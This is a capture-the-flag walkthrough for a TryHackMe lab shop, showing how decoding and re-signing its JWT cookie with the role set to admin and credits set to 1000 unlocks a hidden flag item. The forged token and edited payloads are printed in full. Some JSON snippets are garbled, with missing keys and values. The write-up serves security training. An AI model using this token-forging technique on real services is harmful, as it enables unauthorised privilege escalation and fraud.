# TryHeartMe Walkthrough

## Intro
Welcome to the TryHeartMe challenge, here is the link to the [room](https://tryhackme.com/room/lafb2026e5) on TryHackMe.
This is an easy level challenge about a vulnerability in a online shop, part of the Valentine 2026 event.

### Scenario 
The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?   
You can access the web app here: `http://MACHINE_IP:5000`

<br/>

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
Let's take a look at the website by navigating to `http://MACHINE_IP:5000` in our web browser.
We land on an online shop for Valentine's gitfs, we can click on the top right signup button to create a new account and log-in.

Once logged we can see that our user has 0 credits currently and to buy any item we need a certain amount of them.
Either capturing the requests or using the browser's dev tools we can find a cookie containing a JWT token:
```http
POST /buy/love-letter HTTP/1.1
....
Cookie: tryheartme_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3MTc4ODY1MiwidGhlbWUiOiJ2YWxlbnRpbmUifQ.Ji7ZHs7dztoBuslI1c4E6KeA5wJB0nYthTWV-bRPm1o
```

We can view the content of t he JWT token using a tool such as `jwt_tool` or the online one https://www.jwt.io/.
Which shows us:

- Header:
```json
{
  : "HS256",
  : "JWT"
}
```

- Payload:
```json
{
  "email": "test@test.com",
  "role": "user",
  "credits": 0,
  : ,
  "theme": "valentine"
}
```

We can find that it contains encoded the amount of credits we have, if  we can forge a new token changing that value and swap the old one with it we will "magically" have credits to buy things.
If you are using the online version you should now switch from debugger to JWT Encoder, here we can modify the payload to change our credits and also to upgrade ourselves from "user" to "admins":
```json
{
  "email": "test@test.com",
  "role": "admin",
  "credits": 1000,
  : ,
  "theme": "valentine"
}
```

It will produce the following token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjoxMDAwLCJpYXQiOjE3NzE3ODg2NTIsInRoZW1lIjoidmFsZW50aW5lIn0.jvpSTfosYDMaR0jg6VYnsN7wPpEbVTtOA6sgB0uKMQo
```

Now we can copy it, delete the old cookie value and paste this one inside, when done you can refresh the page.

Finally after refresh you should see you now have 1k credits and as admin you can also buy the "ValenFlag" item, upon buying it we receive the flag:
--> REDACTED 

<br/>
<br/>

Congratulations, you have successfully manipulated the insecure Jason Web Token to log as the admin and have unlimited money to buy everything in the shop.

Happy Valentine!

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
